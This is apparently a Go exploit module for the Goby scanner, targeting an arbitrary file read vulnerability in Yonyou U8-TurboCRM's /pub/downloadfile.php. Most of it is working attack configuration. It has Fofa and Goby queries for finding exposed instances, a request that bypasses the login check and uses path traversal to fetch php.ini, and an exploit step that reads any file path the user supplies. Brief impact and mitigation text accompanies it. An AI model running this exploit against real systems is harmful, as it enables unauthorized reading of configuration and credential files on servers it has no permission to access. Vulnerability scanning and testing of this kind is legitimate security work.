package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "U8-CRM /pub/downloadfile.php File Read Vulnerability",
    "Description": "<p>UFIDA U8-TurboCRM is a customer relationship management (CRM) system developed by UFIDA Software. It is developed based on UFIDA U8 enterprise management software platform and is designed to help enterprises effectively manage and maintain relationships with customers. The system provides a range of functions, including customer information management, sales opportunity tracking, marketing campaign management, customer service support, and more. This system was found to have an arbitrary file reading vulnerability in /pub/downloadfile.php.</p>",
    "Product": "yonyou-TurboCRM",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2024-04-06",
    "PostTime": "2024-05-15",
    "Author": "secure_insights@163.com",
    "FofaQuery": "body=\"/ajax/logincheckcodeflag.php\" && body=\"/login/login.php\" ",
    "GobyQuery": "body=\"/ajax/logincheckcodeflag.php\" && body=\"/login/login.php\" ",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/KSBB0ErPy3LqWX6xmEtG6w"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/datacache/../../../apache/php.ini",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "python-requests/2.31.0",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[PHP]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/pub/downloadfile.php"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/pub/downloadfile.php?DontCheckLogin=1&url={{{filepath}}}",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "python-requests/2.31.0",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "filename=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.4",
    "Translation": {
        "CN": {
            "Name": "用友U8-TurboCRM /pub/downloadfile.php 文件读取漏洞",
            "Product": "用友-TurboCRM",
            "Description": "<p>用友U8-TurboCRM&nbsp;是一款由用友软件开发的客户关系管理（CRM）系统。它是基于用友U8企业管理软件平台开发的，旨在帮助企业有效管理和维护与客户之间的关系。该系统提供了一系列功能，包括客户信息管理、销售机会跟踪、市场营销活动管理、客户服务支持等。这个系统被发现/pub/downloadfile.php存在任意文件读取漏洞。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "U8-CRM /pub/downloadfile.php File Read Vulnerability",
            "Product": "yonyou-TurboCRM",
            "Description": "<p>UFIDA U8-TurboCRM&nbsp;is a customer relationship management (CRM) system developed by UFIDA Software. It is developed based on UFIDA U8 enterprise management software platform and is designed to help enterprises effectively manage and maintain relationships with customers. The system provides a range of functions, including customer information management, sales opportunity tracking, marketing campaign management, customer service support, and more. This system was found to have an arbitrary file reading vulnerability in /pub/downloadfile.php.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10950"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}